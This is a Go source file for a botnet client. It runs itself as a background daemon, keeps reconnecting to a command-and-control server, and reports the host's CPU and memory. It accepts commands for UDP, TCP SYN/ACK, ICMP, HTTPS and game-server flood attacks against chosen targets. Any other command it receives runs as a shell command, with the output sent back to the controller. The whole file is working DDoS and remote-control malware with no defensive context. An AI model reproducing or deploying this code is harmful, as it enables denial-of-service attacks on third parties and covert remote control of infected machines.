package main

import (
	"bufio"
	"fmt"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"time"

	"go_net/pkg/attacks/fivem"
	"go_net/pkg/attacks/http"
	"go_net/pkg/attacks/icmp"
	"go_net/pkg/attacks/tcp"
	"go_net/pkg/attacks/udp"
	"go_net/pkg/core"
)

const (
	serverAddr = "ip:6703"
	retryDelay = 10 * time.Second
)

func main() {
	rand.Seed(time.Now().UnixNano())

	if os.Getenv("IS_DAEMON") != "1" {
		cmd := exec.Command(os.Args[0], os.Args[1:]...)
		cmd.Env = append(os.Environ(), "IS_DAEMON=1")
		err := cmd.Start()
		if err == nil {
			os.Exit(0)
		}
	}

	if len(os.Args) >= 2 {
		core.BotGroup = os.Args[1]
	}

	for {
		conn, err := net.Dial("tcp", serverAddr)
		if err != nil {
			time.Sleep(retryDelay)
			continue
		}

		handleConnection(conn)
	}

}

func handleConnection(conn net.Conn) {
	defer conn.Close()

	info := fmt.Sprintf("%s|%d|%d\n", core.BotGroup, runtime.NumCPU(), getTotalRAM())
	_, err := conn.Write([]byte(info))
	if err != nil {
		return
	}

	scanner := bufio.NewScanner(conn)
	for scanner.Scan() {
		command := scanner.Text()

		parts := strings.Fields(command)
		if len(parts) == 0 {
			continue
		}

		switch parts[0] {
		case "!udp":
			handleUDPCommand(parts, conn)
		case "!udpplain":
			handleUDPPlainCommand(parts, conn)
		case "!tcplegit":
			handleTCPLegitCommand(parts, conn)
		case "!https2":
			handleHTTPS2Command(parts, conn)
		case "!fivem":
			handleFiveMCommand(parts, conn)
		case "!syn":
			handleSYNCommand(parts, conn)
		case "!ack":
			handleACKCommand(parts, conn)
		case "!icmp":
			handleICMPCommand(parts, conn)
		case "!fortnite":
			handleFortniteCommand(parts, conn)
		case "!reboot":
			handleRebootCommand(conn)
		case "!stop":
			handleStopCommand(conn)
		case "!status":
			handleStatusCommand(conn)
		default:
			handleShellCommand(command, conn)
		}
	}

	if err := scanner.Err(); err != nil {
	}
}

func handleUDPCommand(args []string, conn net.Conn) {
	if len(args) < 3 {
		core.SendResponse(conn, "Invalid !udp command. Usage: !udp <ip> <time> dport=<port> [options...]")
		return
	}

	targetIP := args[1]
	duration, err := strconv.Atoi(args[2])
	if err != nil {
		core.SendResponse(conn, "ERROR: Invalid duration.")
		return
	}

	targetPort := 0
	packetSize := 1024
	targetGroup := ""
	sourcePort := 0

	for i := 3; i < len(args); i++ {
		kv := strings.SplitN(args[i], "=", 2)
		if len(kv) != 2 {
			continue
		}
		key := strings.ToLower(kv[0])
		val := kv[1]

		switch key {
		case "dport":
			targetPort = extractInt(val)
		case "len":
			packetSize = extractInt(val)
		case "group":
			targetGroup = val
		case "sport":
			sp, err := strconv.Atoi(val)
			if err == nil {
				sourcePort = sp
			}
		}
	}

	if targetGroup != "" && targetGroup != core.BotGroup {
		return
	}

	if targetPort == 0 {
		core.SendResponse(conn, "ERROR: Target port (dport) is required.")
		return
	}

	core.SetAttackStop(true)
	time.Sleep(100 * time.Millisecond)

	core.SetAttackStop(false)
	go udp.StartFlood(targetIP, targetPort, sourcePort, duration, packetSize, conn)
}

func handleUDPPlainCommand(args []string, conn net.Conn) {
	if len(args) < 3 {
		core.SendResponse(conn, "Invalid !udpplain command. Usage: !udpplain <ip> <time> dport=<port> [options...]")
		return
	}

	targetIP := args[1]
	duration, err := strconv.Atoi(args[2])
	if err != nil {
		core.SendResponse(conn, "ERROR: Invalid duration.")
		return
	}

	targetPort := 0
	packetSize := 1024
	targetGroup := ""
	sourcePort := 0

	for i := 3; i < len(args); i++ {
		kv := strings.SplitN(args[i], "=", 2)
		if len(kv) != 2 {
			continue
		}
		key := strings.ToLower(kv[0])
		val := kv[1]

		switch key {
		case "dport":
			targetPort = extractInt(val)
		case "len":
			packetSize = extractInt(val)
		case "group":
			targetGroup = val
		case "sport":
			sp, err := strconv.Atoi(val)
			if err == nil {
				sourcePort = sp
			}
		}
	}

	if targetGroup != "" && targetGroup != core.BotGroup {
		return
	}

	if targetPort == 0 {
		core.SendResponse(conn, "ERROR: Target port (dport) is required.")
		return
	}

	if packetSize == 0 {
		packetSize = 1024
	}

	core.SetAttackStop(true)
	time.Sleep(100 * time.Millisecond)

	core.SetAttackStop(false)
	go udp.StartPlainFlood(targetIP, targetPort, sourcePort, duration, packetSize, conn)
}

func handleStopCommand(conn net.Conn) {
	core.SetAttackStop(true)
	core.SendResponse(conn, "INFO: Attack stopped.")
}

func handleStatusCommand(conn net.Conn) {
	isStopped := core.GetAttackStop()
	status := "IDLE"
	if !isStopped {
		status = "ATTACKING"
	}
	core.SendResponse(conn, fmt.Sprintf("STATUS: %s | Group: %s", status, core.BotGroup))
}

func handleShellCommand(cmd string, conn net.Conn) {
	output, err := executeCommand(cmd)
	response := output
	if err != nil {
		response = fmt.Sprintf("ERROR: %v\nOutput:\n%s", err, output)
	}
	core.SendResponse(conn, response)
}

func handleTCPLegitCommand(args []string, conn net.Conn) {
	if len(args) < 3 {
		core.SendResponse(conn, "ERROR: Invalid !tcplegit command. Usage: !tcplegit <ip> <time> [dport=port] [len=length]")
		return
	}

	targetIP := args[1]
	duration, err := strconv.Atoi(args[2])
	if err != nil {
		core.SendResponse(conn, "ERROR: Invalid duration.")
		return
	}

	targetPort := 80
	targetGroup := ""

	for i := 3; i < len(args); i++ {
		kv := strings.SplitN(args[i], "=", 2)
		if len(kv) != 2 {
			continue
		}
		key := strings.ToLower(kv[0])
		val := kv[1]

		switch key {
		case "dport":
			p, err := strconv.Atoi(val)
			if err == nil {
				targetPort = p
			}
		case "group":
			targetGroup = val
		}
	}

	if targetGroup != "" && targetGroup != core.BotGroup {
		return
	}

	core.SetAttackStop(true)
	time.Sleep(100 * time.Millisecond)

	core.SetAttackStop(false)
	go tcp.StartLegitFlood(targetIP, targetPort, duration, conn)
}

func handleFiveMCommand(args []string, conn net.Conn) {
	if len(args) < 3 {
		core.SendResponse(conn, "ERROR: Invalid !fivem command. Usage: !fivem <ip> <time> [dport=port]")
		return
	}

	targetIP := args[1]
	duration, err := strconv.Atoi(args[2])
	if err != nil {
		core.SendResponse(conn, "ERROR: Invalid duration.")
		return
	}

	targetPort := 30120
	targetGroup := ""

	for i := 3; i < len(args); i++ {
		kv := strings.SplitN(args[i], "=", 2)
		if len(kv) != 2 {
			continue
		}
		key := strings.ToLower(kv[0])
		val := kv[1]

		switch key {
		case "dport":
			p, err := strconv.Atoi(val)
			if err == nil {
				targetPort = p
			}
		case "group":
			targetGroup = val
		}
	}

	if targetGroup != "" && targetGroup != core.BotGroup {
		return
	}

	core.SetAttackStop(true)
	time.Sleep(100 * time.Millisecond)

	core.SetAttackStop(false)
	go fivem.StartFlood(targetIP, targetPort, duration, conn)
}

func handleSYNCommand(args []string, conn net.Conn) {
	if len(args) < 2 {
		core.SendResponse(conn, "ERROR: Invalid !syn command. Usage: !syn <ip> <time> dport=<port>")
		return
	}

	targetIP := args[1]
	duration, err := strconv.Atoi(args[2])

	if err != nil {
		core.SendResponse(conn, "ERROR: Invalid duration.")
		return
	}

	targetPort := 0
	targetGroup := ""

	for i := 3; i < len(args); i++ {
		kv := strings.SplitN(args[i], "=", 2)
		if len(kv) != 2 {
			continue
		}
		key := strings.ToLower(kv[0])
		val := kv[1]

		switch key {
		case "dport":
			p, err := strconv.Atoi(val)
			if err == nil {
				targetPort = p
			}
		case "group":
			targetGroup = val
		}
	}

	if targetGroup != "" && targetGroup != core.BotGroup {
		return
	}

	if targetPort == 0 {
		targetPort = rand.Intn(65535) + 1
	}

	core.SetAttackStop(true)
	time.Sleep(100 * time.Millisecond)

	core.SetAttackStop(false)
	go tcp.StartSYNFlood(targetIP, targetPort, duration, conn)
}

func handleACKCommand(args []string, conn net.Conn) {
	if len(args) < 2 {
		core.SendResponse(conn, "ERROR: Invalid !ack command. Usage: !ack <ip> <time> dport=<port>")
		return
	}

	targetIP := args[1]
	duration, err := strconv.Atoi(args[2])

	if err != nil {
		core.SendResponse(conn, "ERROR: Invalid duration.")
		return
	}

	targetPort := 0
	targetGroup := ""

	for i := 3; i < len(args); i++ {
		kv := strings.SplitN(args[i], "=", 2)
		if len(kv) != 2 {
			continue
		}
		key := strings.ToLower(kv[0])
		val := kv[1]

		switch key {
		case "dport":
			p, err := strconv.Atoi(val)
			if err == nil {
				targetPort = p
			}
		case "group":
			targetGroup = val
		}
	}

	if targetGroup != "" && targetGroup != core.BotGroup {
		return
	}

	if targetPort == 0 {
		targetPort = rand.Intn(65535) + 1
	}

	core.SetAttackStop(true)
	time.Sleep(100 * time.Millisecond)

	core.SetAttackStop(false)
	go tcp.StartACKFlood(targetIP, targetPort, duration, conn)
}

func handleICMPCommand(args []string, conn net.Conn) {
	if len(args) < 3 {
		core.SendResponse(conn, "ERROR: Invalid !icmp command. Usage: !icmp <ip> <time> [group=<group>]")
		return
	}

	targetIP := args[1]
	duration, err := strconv.Atoi(args[2])
	if err != nil {
		core.SendResponse(conn, "ERROR: Invalid duration.")
		return
	}

	targetGroup := ""
	for i := 3; i < len(args); i++ {
		kv := strings.SplitN(args[i], "=", 2)
		if len(kv) == 2 && strings.ToLower(kv[0]) == "group" {
			targetGroup = kv[1]
		}
	}

	if targetGroup != "" && targetGroup != core.BotGroup {
		return
	}

	core.SetAttackStop(true)
	time.Sleep(100 * time.Millisecond)

	core.SetAttackStop(false)
	go icmp.StartFlood(targetIP, duration, conn)
}

func handleFortniteCommand(args []string, conn net.Conn) {
	if len(args) < 3 {
		core.SendResponse(conn, "ERROR: Invalid !fortnite command. Usage: !fortnite <ip> <time> [dport=port]")
		return
	}

	targetIP := args[1]
	duration, err := strconv.Atoi(args[2])
	if err != nil {
		core.SendResponse(conn, "ERROR: Invalid duration.")
		return
	}

	targetPort := 9000
	targetGroup := ""

	for i := 3; i < len(args); i++ {
		kv := strings.SplitN(args[i], "=", 2)
		if len(kv) != 2 {
			continue
		}
		key := strings.ToLower(kv[0])
		val := kv[1]

		switch key {
		case "dport":
			p, err := strconv.Atoi(val)
			if err == nil {
				targetPort = p
			}
		case "group":
			targetGroup = val
		}
	}

	if targetGroup != "" && targetGroup != core.BotGroup {
		return
	}

	core.SetAttackStop(true)
	time.Sleep(100 * time.Millisecond)

	core.SetAttackStop(false)
	go udp.StartFortniteFlood(targetIP, targetPort, duration, conn)
}

func handleHTTPS2Command(args []string, conn net.Conn) {
	if len(args) < 4 {
		core.SendResponse(conn, "ERROR: Invalid !https2 command. Usage: !https2 <url> <time> <threads> [cache=true/false]")
		return
	}

	targetURL := args[1]
	duration, err1 := strconv.Atoi(args[2])
	threads, err2 := strconv.Atoi(args[3])

	if err1 != nil || err2 != nil {
		core.SendResponse(conn, "ERROR: Invalid time or threads.")
		return
	}

	bypassCache := false
	if len(args) >= 5 {
		if args[4] == "cache=true" {
			bypassCache = true
		}
	}

	core.SetAttackStop(true)
	time.Sleep(100 * time.Millisecond)

	core.SetAttackStop(false)
	go http.StartHTTPS2Flood(targetURL, duration, threads, bypassCache, conn)
}

func executeCommand(cmd string) (string, error) {
	var execCmd *exec.Cmd
	if runtime.GOOS == "windows" {
		execCmd = exec.Command("cmd.exe", "/C", cmd)
	} else {
		execCmd = exec.Command("bash", "-c", cmd)
	}
	output, execErr := execCmd.CombinedOutput()
	return string(output), execErr
}

func handleRebootCommand(conn net.Conn) {
	core.SendResponse(conn, "INFO: Rebooting...")
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("shutdown", "/r", "/t", "0")
	} else {
		cmd = exec.Command("reboot")
	}
	cmd.Run()
}

func getTotalRAM() int64 {
	if runtime.GOOS == "windows" {
		out, err := exec.Command("powershell", "-NoProfile", "-Command", "(Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory").Output()
		if err == nil {
			val, _ := strconv.ParseInt(strings.TrimSpace(string(out)), 10, 64)
			return val
		}
	} else {
		f, err := os.Open("/proc/meminfo")
		if err == nil {
			defer f.Close()
			scanner := bufio.NewScanner(f)
			for scanner.Scan() {
				line := scanner.Text()
				if strings.HasPrefix(line, "MemTotal:") {
					parts := strings.Fields(line)
					if len(parts) >= 2 {
						kb, _ := strconv.ParseInt(parts[1], 10, 64)
						return kb * 1024
					}
				}
			}
		}
	}
	return 0
}

func extractInt(s string) int {
	var sb strings.Builder
	for _, r := range s {
		if r >= '0' && r <= '9' {
			sb.WriteRune(r)
		}
	}
	val, _ := strconv.Atoi(sb.String())
	return val
}
